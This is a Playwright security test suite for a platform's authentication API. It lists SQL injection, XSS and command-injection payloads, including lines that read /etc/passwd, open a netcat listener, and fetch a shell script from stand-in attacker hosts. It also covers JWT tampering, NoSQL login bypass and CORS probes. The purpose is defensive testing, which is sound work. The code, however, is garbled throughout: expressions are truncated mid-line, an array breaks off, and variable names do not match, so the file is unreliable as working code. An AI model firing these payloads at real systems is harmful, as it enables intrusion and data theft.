/**
 * HASIVU Platform - Authentication API Security Testing Suite
 * 
 * This test suite conducts comprehensive security testing for authentication endpoints:
 * 1. Vulnerability Assessment - SQL injection, XSS, CSRF, etc.
 * 2. Authentication Bypass Attempts
 * 3. Token Manipulation and JWT Security
 * 4. Rate Limiting and DoS Protection
 * 5. CORS and Security Headers Validation
 * 6. Input Validation and Sanitization
 * 7. Session Security and Management
 * 
 * Security Standards: OWASP Top 10, JWT Best Practices, API Security Guidelines
 */

import { test, expect } from '@playwright/test';
import * as crypto from 'crypto';

// Security Test Configuration
const SECURITY_CONFIG = {
  API_BASE_URL: process.env.NEXT_PUBLIC_API_URL || 'https://api.hasivu.com',
  TEST_TIMEOUT: 30000,
  
  // Attack Payloads
  SQL_INJECTION_PAYLOADS: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "admin' OR '1'='1",
    "' OR 1=1#",
    "') OR '1'='1--",
    "1' OR '1'='1",
    "OR 1=1",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "'''''''''''''UNION SELECT '2",
    "%27%20OR%201=1",
    "1; exec master..xp_cmdshell('ping google.com')--"
  ],
  
  XSS_PAYLOADS: [
    '<script>alert("xss")</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload="alert(1)">',
    'javascript:alert("xss")',
    '<iframe src="javascript:alert(`xss`)">',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<video><source onerror="alert(1)">',
    '<audio src="nonexistent.mp3" onerror="alert(1)">',
    '<details open ontoggle="alert(1)">',
    '<marquee onstart="alert(1)">',
    '"onmouseover="alert(1)"',
    "'onmouseover='alert(1)'",
    '"><script>alert(1)</script>'
  ],
  
  COMMAND_INJECTION_PAYLOADS: [
    '; ls -la',
    '| whoami',
    '&& cat /etc/passwd',
    '|| id',
    '`id`',
    '$(id)',
    '; ping google.com',
    '| nc -lvp 4444',
    '&& curl http://evil.com',
    '; wget http://malicious.com/shell.sh',
    '$(curl http://attacker.com)',
    '`ping -c 10 127.0.0.1`'
  ],
  
  LDAP_INJECTION_PAYLOADS: [
    '*',
    '*)(_uid = *',
    '*)(|(uid
// Security Test Results Collector
class SecurityTestResults {
  private results: Array<{
    testType: string;
    payload: string;
    endpoint: string;
    status: number;
    vulnerable: boolean;
    description: string;
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  }> = [];

  addResult(result: {
    testType: string;
    payload: string;
    endpoint: string;
    status: number;
    vulnerable: boolean;
    description: string;
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  }) {
    this.results.push(result);
  }

  getVulnerabilities() {
    return this.results.filter(_r = > r.vulnerable);
  }

  getSummary() {
    const _vulnerabilities =  this.getVulnerabilities();
    const _counts =  {
      critical: vulnerabilities.filter(v 
    return {
      totalTests: this.results.length,
      totalVulnerabilities: vulnerabilities.length,
      severityCounts: counts,
      vulnerabilities: vulnerabilities
    };
  }

  generateReport() {
    const _summary =  this.getSummary();
    
    let _report =  '\n🛡️ AUTHENTICATION SECURITY TEST REPORT\n';
    report += '='.repeat(50) + '\n\n';
    
    report += `Total Tests: ${summary.totalTests}\n`;
    report += `Vulnerabilities Found: ${summary.totalVulnerabilities}\n\n`;
    
    if (summary.totalVulnerabilities > 0) {
      report += 'Severity Breakdown:\n';
      report += `- Critical: ${summary.severityCounts.critical}\n`;
      report += `- High: ${summary.severityCounts.high}\n`;
      report += `- Medium: ${summary.severityCounts.medium}\n`;
      report += `- Low: ${summary.severityCounts.low}\n\n`;
      
      report += 'Detailed Vulnerabilities:\n';
      summary.vulnerabilities.forEach(_(vuln, _index) => {
        report += `${index + 1}. [${vuln.severity.toUpperCase()}] ${vuln.testType}\n`;
        report += `   Endpoint: ${vuln.endpoint}\n`;
        report += `   Payload: ${vuln.payload}\n`;
        report += `   Description: ${vuln.description}\n\n`;
      });
    } else {
      report += '✅ No vulnerabilities found!\n';
    }
    
    return report;
  }
}

const _securityResults =  new SecurityTestResults();

test.describe(_'🛡️ Authentication API Security Testing', _() => {
  
  test.describe(_'1. SQL Injection Testing', _() => {
    
    test(_'💉 SQL injection in login credentials', _async ({ request }) => {
      console.log('🔍 Testing SQL injection vulnerabilities...');
      
      for (const payload of SECURITY_CONFIG.SQL_INJECTION_PAYLOADS) {
        // Test email field
        const _emailResponse =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
          data: {
            email: payload,
            password: 'normalpassword'
          },
          timeout: SECURITY_CONFIG.TEST_TIMEOUT
        });
        
        const _isVulnerable =  emailResponse.status() 
        securityResults.addResult({
          testType: 'SQL Injection - Email Field',
          payload,
          endpoint: '/auth/login',
          status: emailResponse.status(),
          vulnerable: isVulnerable,
          description: isVulnerable ? 'Possible SQL injection vulnerability in email field' : 'SQL injection attempt properly handled',
          severity: isVulnerable ? 'critical' : 'info'
        });
        
        // Test password field
        const _passwordResponse =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
          data: {
            email: 'test@example.com',
            password: payload
          },
          timeout: SECURITY_CONFIG.TEST_TIMEOUT
        });
        
        const _passwordVulnerable =  passwordResponse.status() 
        securityResults.addResult({
          testType: 'SQL Injection - Password Field',
          payload,
          endpoint: '/auth/login',
          status: passwordResponse.status(),
          vulnerable: passwordVulnerable,
          description: passwordVulnerable ? 'Possible SQL injection vulnerability in password field' : 'SQL injection attempt properly handled',
          severity: passwordVulnerable ? 'critical' : 'info'
        });
        
        expect(isVulnerable).toBe(false);
        expect(passwordVulnerable).toBe(false);
      }
      
      console.log(`✅ SQL injection tests completed: ${SECURITY_CONFIG.SQL_INJECTION_PAYLOADS.length * 2} tests`);
    });
    
    test(_'🔍 SQL injection in registration form', _async ({ request }) => {
      console.log('🔍 Testing SQL injection in registration...');
      
      const _registrationFields =  ['email', 'firstName', 'lastName', 'password'];
      
      for (const field of registrationFields) {
        for (const payload of SECURITY_CONFIG.SQL_INJECTION_PAYLOADS.slice(0, 5)) { // Test subset for performance
          const registrationData: _any =  {
            firstName: 'Test',
            lastName: 'User',
            email: 'test@example.com',
            password: 'Test123!@#',
            role: 'student'
          };
          
          registrationData[field] = payload;
          
          const _response =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/register`, {
            data: registrationData,
            timeout: SECURITY_CONFIG.TEST_TIMEOUT
          });
          
          const _isVulnerable =  response.status() 
          securityResults.addResult({
            testType: `SQL Injection - Registration ${field}`,
            payload,
            endpoint: '/auth/register',
            status: response.status(),
            vulnerable: isVulnerable,
            description: isVulnerable ? `Possible SQL injection vulnerability in registration ${field} field` : 'SQL injection attempt properly handled',
            severity: isVulnerable ? 'critical' : 'info'
          });
          
          expect(isVulnerable).toBe(false);
        }
      }
      
      console.log('✅ Registration SQL injection tests completed');
    });
  });
  
  test.describe('2. Cross-Site Scripting (XSS) Testing', () => {
    
    test(_'🎭 XSS in authentication forms', _async ({ request }) => {
      console.log('🔍 Testing XSS vulnerabilities...');
      
      for (const payload of SECURITY_CONFIG.XSS_PAYLOADS) {
        const _response =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
          data: {
            email: payload,
            password: 'password'
          },
          timeout: SECURITY_CONFIG.TEST_TIMEOUT
        });
        
        const _responseBody =  await response.text();
        const isVulnerable = responseBody.includes('<script>') || 
                            responseBody.includes('alert(') ||
                            responseBody.includes(payload) && !responseBody.includes('&lt;');
        
        securityResults.addResult({
          testType: 'XSS - Login Form',
          payload,
          endpoint: '/auth/login',
          status: response.status(),
          vulnerable: isVulnerable,
          description: isVulnerable ? 'XSS vulnerability detected - payload reflected without sanitization' : 'XSS payload properly sanitized',
          severity: isVulnerable ? 'high' : 'info'
        });
        
        expect(isVulnerable).toBe(false);
      }
      
      console.log(`✅ XSS tests completed: ${SECURITY_CONFIG.XSS_PAYLOADS.length} tests`);
    });
  });
  
  test.describe(_'3. Authentication Bypass Testing', _() => {
    
    test(_'🔓 Authentication bypass attempts', _async ({ request }) => {
      console.log('🔍 Testing authentication bypass techniques...');
      
      const _bypassAttempts =  [
        // Empty credentials
        { email: '', password: '', description: 'Empty credentials' },
        { email: null, password: null, description: 'Null credentials' },
        
        // Special characters
        { email: 'admin', password: 'admin', description: 'Common credentials' },
        { email: 'administrator', password: 'administrator', description: 'Administrator credentials' },
        
        // Array/Object injection
        { email: ['admin@test.com'], password: 'password', description: 'Array injection in email' },
        { email: { '$ne': null }, password: 'password', description: 'Object injection in email' },
        
        // Boolean bypass
        { email: 'admin@test.com', password: true, description: 'Boolean password' },
        { email: true, password: 'password', description: 'Boolean email' },
        
        // JSON injection
        { email: '{"$ne": null}', password: '{"$ne": null}', description: 'JSON injection' }
      ];
      
      for (const attempt of bypassAttempts) {
        try {
          const _response =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
            data: attempt,
            timeout: SECURITY_CONFIG.TEST_TIMEOUT
          });
          
          const _isVulnerable =  response.status() 
          if (isVulnerable) {
            const _responseData =  await response.json();
            // Double-check it's actually a successful login
            const _reallyVulnerable =  responseData.success 
            securityResults.addResult({
              testType: 'Authentication Bypass',
              payload: JSON.stringify(attempt),
              endpoint: '/auth/login',
              status: response.status(),
              vulnerable: reallyVulnerable,
              description: reallyVulnerable ? `Authentication bypass successful: ${attempt.description}` : 'Bypass attempt blocked',
              severity: reallyVulnerable ? 'critical' : 'info'
            });
            
            expect(reallyVulnerable).toBe(false);
          }
        } catch (error) {
          // Request failed, which is expected for malformed requests
          securityResults.addResult({
            testType: 'Authentication Bypass',
            payload: JSON.stringify(attempt),
            endpoint: '/auth/login',
            status: 400,
            vulnerable: false,
            description: `Bypass attempt properly rejected: ${attempt.description}`,
            severity: 'info'
          });
        }
      }
      
      console.log('✅ Authentication bypass tests completed');
    });
    
    test(_'🔐 JWT token manipulation', _async ({ request }) => {
      console.log('🔍 Testing JWT token manipulation...');
      
      // First get a valid token
      const _loginResponse =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
        data: {
          email: 'student@hasivu.test',
          password: 'Test123!'
        }
      });
      
      if (loginResponse.status() === 200) {
        const _loginData =  await loginResponse.json();
        const _validToken =  loginData.data.tokens.accessToken;
        
        const _tokenManipulations =  [
          // Algorithm confusion
          {
            token: validToken.replace('HS256', 'none'),
            description: 'Algorithm confusion - none'
          },
          {
            token: validToken.replace('HS256', 'RS256'),
            description: 'Algorithm confusion - RS256'
          },
          
          // Signature manipulation
          {
            token: validToken + 'tampered',
            description: 'Signature tampering'
          },
          {
            token: validToken.slice(0, -10) + 'fake123456',
            description: 'Signature replacement'
          },
          
          // Payload manipulation
          {
            token: tamperedJWT(validToken, { role: 'admin' }),
            description: 'Role escalation in payload'
          },
          {
            token: tamperedJWT(validToken, { exp: Math.floor(Date.now() / 1000) + 86400 }),
            description: 'Expiration time manipulation'
          },
          
          // Structure manipulation
          {
            token: validToken.split('.').reverse().join('.'),
            description: 'Token structure reversal'
          },
          {
            token: 'fake.' + validToken.split('.')[1] + '.signature',
            description: 'Fake header injection'
          }
        ];
        
        for (const manipulation of tokenManipulations) {
          const _response =  await request.get(`${SECURITY_CONFIG.API_BASE_URL}/api/v1/users/profile`, {
            headers: {
              'Authorization': `Bearer ${manipulation.token}`
            },
            timeout: SECURITY_CONFIG.TEST_TIMEOUT
          });
          
          const _isVulnerable =  response.status() 
          securityResults.addResult({
            testType: 'JWT Token Manipulation',
            payload: manipulation.description,
            endpoint: '/api/v1/users/profile',
            status: response.status(),
            vulnerable: isVulnerable,
            description: isVulnerable ? `JWT manipulation successful: ${manipulation.description}` : 'JWT manipulation properly detected',
            severity: isVulnerable ? 'critical' : 'info'
          });
          
          expect(isVulnerable).toBe(false);
        }
      }
      
      console.log('✅ JWT token manipulation tests completed');
    });
  });
  
  test.describe(_'4. Rate Limiting and DoS Protection', _() => {
    
    test(_'🚦 Rate limiting on authentication endpoints', _async ({ request }) => {
      console.log('🔍 Testing rate limiting protection...');
      
      const _rapidRequests =  Array.from({ length: 100 }, (_, i) 
      const _startTime =  Date.now();
      const _results =  await Promise.allSettled(rapidRequests);
      const _endTime =  Date.now();
      
      const _responses =  results
        .filter(result 
      const _rateLimitedCount =  responses.filter(r 
      const _tooManyRequestsCount =  responses.filter(r 
      const _duration =  endTime - startTime;
      
      const _rateLimitingActive =  rateLimitedCount > 0 || tooManyRequestsCount > 0;
      
      securityResults.addResult({
        testType: 'Rate Limiting',
        payload: `100 rapid requests in ${duration}ms`,
        endpoint: '/auth/login',
        status: rateLimitingActive ? 429 : 200,
        vulnerable: !rateLimitingActive,
        description: rateLimitingActive ? 
          `Rate limiting active: ${rateLimitedCount} requests blocked` : 
          'No rate limiting detected - potential DoS vulnerability',
        severity: rateLimitingActive ? 'info' : 'medium'
      });
      
      console.log(`📊 Rate limiting results:`);
      console.log(`   Total requests: ${responses.length}`);
      console.log(`   Rate limited: ${rateLimitedCount}`);
      console.log(`   Duration: ${duration}ms`);
      console.log(`   Rate limiting active: ${rateLimitingActive ? 'Yes' : 'No'}`);
      
      // Rate limiting is recommended but not required to pass
    });
    
    test(_'💥 Account lockout protection', _async ({ request }) => {
      console.log('🔍 Testing account lockout protection...');
      
      const _testEmail =  'lockout.test@hasivu.test';
      const _failedAttempts =  10;
      
      const _attempts =  Array.from({ length: failedAttempts }, () 
      const _results =  await Promise.allSettled(attempts);
      const _responses =  results
        .filter(result 
      const _statusCodes =  responses.map(r 
      const _lockedOutResponses =  statusCodes.filter(status 
      const _accountLockoutActive =  lockedOutResponses > 0;
      
      securityResults.addResult({
        testType: 'Account Lockout Protection',
        payload: `${failedAttempts} failed login attempts`,
        endpoint: '/auth/login',
        status: accountLockoutActive ? 423 : 401,
        vulnerable: !accountLockoutActive,
        description: accountLockoutActive ? 
          'Account lockout protection active' : 
          'No account lockout detected - potential brute force vulnerability',
        severity: accountLockoutActive ? 'info' : 'medium'
      });
      
      console.log(`🔒 Account lockout test results:`);
      console.log(`   Failed attempts: ${failedAttempts}`);
      console.log(`   Lockout responses: ${lockedOutResponses}`);
      console.log(`   Protection active: ${accountLockoutActive ? 'Yes' : 'No'}`);
    });
  });
  
  test.describe(_'5. Security Headers and CORS', _() => {
    
    test(_'🛡️ Security headers validation', _async ({ request }) => {
      console.log('🔍 Testing security headers...');
      
      const _response =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
        data: {
          email: 'test@example.com',
          password: 'password'
        }
      });
      
      const _headers =  response.headers();
      
      const _requiredSecurityHeaders =  {
        'x-content-type-options': 'nosniff',
        'x-frame-options': /^(DENY|SAMEORIGIN)$/i,
        'x-xss-protection': /^1/,
        'strict-transport-security': /^max-age
      for (const [headerName, expectedValue] of Object.entries(requiredSecurityHeaders)) {
        const _headerValue =  headers[headerName];
        const _isPresent =  !!headerValue;
        const _isValid =  isPresent && (
          typeof expectedValue 
        securityResults.addResult({
          testType: 'Security Headers',
          payload: headerName,
          endpoint: '/auth/login',
          status: response.status(),
          vulnerable: !isValid,
          description: isValid ? 
            `Security header ${headerName} properly configured: ${headerValue}` :
            `Missing or misconfigured security header: ${headerName}`,
          severity: isValid ? 'info' : 'low'
        });
        
        console.log(`${isValid ? '✅' : '⚠️'} ${headerName}: ${headerValue || 'missing'}`);
      }
    });
    
    test(_'🌐 CORS configuration testing', _async ({ request }) => {
      console.log('🔍 Testing CORS configuration...');
      
      const _maliciousOrigins =  [
        'http://evil.com',
        'https://attacker.example.com',
        'null',
        'file://',
        'data:text/html,<script>alert(1)</script>'
      ];
      
      for (const origin of maliciousOrigins) {
        const _response =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
          headers: {
            'Origin': origin,
            'Access-Control-Request-Method': 'POST',
            'Access-Control-Request-Headers': 'content-type'
          },
          data: {
            email: 'test@example.com',
            password: 'password'
          }
        });
        
        const _corsHeaders =  response.headers();
        const _allowsOrigin =  corsHeaders['access-control-allow-origin'] 
        securityResults.addResult({
          testType: 'CORS Configuration',
          payload: origin,
          endpoint: '/auth/login',
          status: response.status(),
          vulnerable: allowsOrigin,
          description: allowsOrigin ? 
            `CORS allows potentially malicious origin: ${origin}` :
            `CORS properly restricts origin: ${origin}`,
          severity: allowsOrigin ? 'medium' : 'info'
        });
        
        expect(allowsOrigin).toBe(false);
      }
      
      console.log('✅ CORS configuration tests completed');
    });
  });
  
  test.describe(_'6. Session Security Testing', _() => {
    
    test(_'🍪 Session cookie security', _async ({ request }) => {
      console.log('🔍 Testing session cookie security...');
      
      const _response =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
        data: {
          email: 'student@hasivu.test',
          password: 'Test123!'
        }
      });
      
      if (response.status() === 200) {
        const _cookies =  response.headers()['set-cookie'] || '';
        
        const _cookieSecurityChecks =  {
          'HttpOnly flag': /HttpOnly/i.test(cookies),
          'Secure flag': /Secure/i.test(cookies),
          'SameSite attribute': /SameSite
        for (const [checkName, passed] of Object.entries(cookieSecurityChecks)) {
          securityResults.addResult({
            testType: 'Session Cookie Security',
            payload: checkName,
            endpoint: '/auth/login',
            status: response.status(),
            vulnerable: !passed,
            description: passed ? 
              `Cookie security check passed: ${checkName}` :
              `Cookie security issue: Missing ${checkName}`,
            severity: passed ? 'info' : 'low'
          });
        }
        
        console.log('Session cookies:', cookies);
      }
    });
    
    test(_'⏰ Session timeout validation', _async ({ request }) => {
      console.log('🔍 Testing session timeout...');
      
      const _loginResponse =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
        data: {
          email: 'student@hasivu.test',
          password: 'Test123!'
        }
      });
      
      if (loginResponse.status() === 200) {
        const _loginData =  await loginResponse.json();
        const _accessToken =  loginData.data.tokens.accessToken;
        const _expiresIn =  loginData.data.tokens.expiresIn;
        
        // Check if token has reasonable expiration
        const reasonableExpiration = expiresIn > 0 && expiresIn <= 86400; // Max 24 hours
        
        securityResults.addResult({
          testType: 'Session Timeout',
          payload: `Token expires in ${expiresIn} seconds`,
          endpoint: '/auth/login',
          status: loginResponse.status(),
          vulnerable: !reasonableExpiration,
          description: reasonableExpiration ? 
            'Session timeout properly configured' :
            expiresIn <= 0 ? 'Token never expires - security risk' : 'Token expiration too long',
          severity: reasonableExpiration ? 'info' : 'medium'
        });
        
        console.log(`Token expiration: ${expiresIn} seconds`);
      }
    });
  });
  
  test.describe(_'7. Input Validation Testing', _() => {
    
    test(_'📝 Input length and format validation', _async ({ request }) => {
      console.log('🔍 Testing input validation...');
      
      const _inputTests =  [
        // Extremely long inputs
        {
          email: 'a'.repeat(10000) + '@example.com',
          password: 'password',
          description: 'Extremely long email'
        },
        {
          email: 'test@example.com',
          password: 'a'.repeat(10000),
          description: 'Extremely long password'
        },
        
        // Special characters and encoding
        {
          email: 'test@example.com\x00\x01\x02',
          password: 'password',
          description: 'Null bytes in email'
        },
        {
          email: 'test@example.com',
          password: 'password\x00\x01\x02',
          description: 'Null bytes in password'
        },
        
        // Unicode and encoding issues
        {
          email: 'tëst@éxämplé.cöm',
          password: 'pássword',
          description: 'Unicode characters'
        },
        {
          email: decodeURIComponent('%E2%80%8Etest%E2%80%8F@example.com'),
          password: 'password',
          description: 'Unicode direction markers'
        }
      ];
      
      for (const inputTest of inputTests) {
        try {
          const _response =  await request.post(`${SECURITY_CONFIG.API_BASE_URL}/auth/login`, {
            data: {
              email: inputTest.email,
              password: inputTest.password
            },
            timeout: SECURITY_CONFIG.TEST_TIMEOUT
          });
          
          const _status =  response.status();
          const _properlyValidated =  status 
          securityResults.addResult({
            testType: 'Input Validation',
            payload: inputTest.description,
            endpoint: '/auth/login',
            status,
            vulnerable: !properlyValidated && status !== 401, // 401 is acceptable for invalid login
            description: properlyValidated ? 
              'Input properly validated and rejected' :
              `Input validation issue: ${inputTest.description}`,
            severity: properlyValidated ? 'info' : 'low'
          });
          
        } catch (error) {
          // Request failed - this is actually good for malformed input
          securityResults.addResult({
            testType: 'Input Validation',
            payload: inputTest.description,
            endpoint: '/auth/login',
            status: 400,
            vulnerable: false,
            description: `Malformed input properly rejected: ${inputTest.description}`,
            severity: 'info'
          });
        }
      }
      
      console.log('✅ Input validation tests completed');
    });
  });
});

// Helper function to create tampered JWT
function tamperedJWT(originalToken: string, payloadChanges: object): string {
  try {
    const _parts =  originalToken.split('.');
    if (parts.length !== 3) return originalToken;
    
    const _payload =  JSON.parse(Buffer.from(parts[1], 'base64').toString());
    const _tamperedPayload =  { ...payload, ...payloadChanges };
    const _encodedPayload =  Buffer.from(JSON.stringify(tamperedPayload)).toString('base64')
      .replace(/\+/g, '-').replace(/\//g, '_').replace(_/
    return `${parts[0]}.${encodedPayload}.${parts[2]}`;
  } catch {
    return originalToken;
  }
}

// Generate final security report
test.afterAll(async () => {
  const _report =  securityResults.generateReport();
  console.log(report);
  
  // Optionally write report to file
  // require('fs').writeFileSync('security-test-report.txt', report);
});